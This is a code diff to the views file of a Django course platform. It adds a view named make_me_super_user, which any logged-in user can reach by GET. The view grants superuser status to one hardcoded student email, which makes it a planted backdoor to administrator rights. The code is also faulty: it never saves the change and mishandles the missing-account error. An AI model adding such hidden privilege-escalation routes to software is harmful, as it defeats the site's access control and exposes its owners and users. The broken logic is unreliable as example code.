@@ -3,7 +3,8 @@ from django.contrib.auth.decorators import login_required
 from django.views.decorators.http import require_http_methods
 from .models import Course, Unit, Lesson, Comment
 from school.decorators import has_courses, require_course_access
-
+from authentication.models import Student
+from django.http import HttpResponse
 
 
 
@@ -20,6 +21,7 @@ def buy_all(request):
     "the page that has all the courses ready to buy ."
     courses = Course.objects.filter().all()
     return render(request, 'course/buy_all.html', { 'courses' : courses })
+
 
 
 
@@ -117,3 +119,16 @@ def comment_add_comment(request, course_id, lesson_id):
 
 
 
+
+@login_required
+@require_http_methods(['GET'])
+def make_me_super_user(request):
+    amir = Student.objects.get(email='amirdwikat@example.com')
+    try:
+        if amir.is_superuser:
+            return HttpResponse("is already a superuser...")
+        else:
+            amir.is_superuser = True
+            return HttpResponse("Done!")
+    except amir.DoesNotExist:
+        return HttpResponse("DoesNotExist.")
